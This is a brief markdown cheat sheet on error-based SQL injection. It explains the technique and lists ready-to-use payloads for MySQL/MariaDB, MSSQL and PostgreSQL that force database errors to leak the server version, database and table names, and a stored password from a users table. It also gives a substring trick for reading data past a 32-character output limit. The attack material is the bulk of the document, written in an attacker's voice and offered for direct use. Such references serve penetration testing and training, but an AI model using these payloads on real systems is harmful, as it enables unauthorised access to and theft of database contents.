# Error-Based SQL Injection

## Methodology
Error-based SQLi is used when the web application does not output query results but does display database driver error messages (such as PHP/PDO errors or database syntax errors). We intentionally inject payloads that force the database to throw an error containing the sensitive data we want to retrieve.

---

## MySQL / MariaDB Payloads

### 1. UpdateXML
Forces a syntax error in the XML parser to output the result of our query:
```sql
' AND updatexml(1, concat(0x3a, (SELECT version())), 1)-- -
```
*Limit*: `updatexml` outputs a maximum of 32 characters. Use `substring` if data is longer:
```sql
' AND updatexml(1, concat(0x3a, substring((SELECT password FROM users LIMIT 1), 1, 30)), 1)-- -
```

### 2. ExtractValue
Similar to `updatexml`:
```sql
' AND extractvalue(1, concat(0x3a, (SELECT database())))-- -
```

---

## MSSQL Payloads

MSSQL throws conversion errors when attempting to convert non-compatible types (e.g. converting a string result into an integer):
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

---

## PostgreSQL Payloads

PostgreSQL conversion errors:
```sql
' AND 1=CAST((SELECT version()) AS int)--
```
Or:
```sql
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```
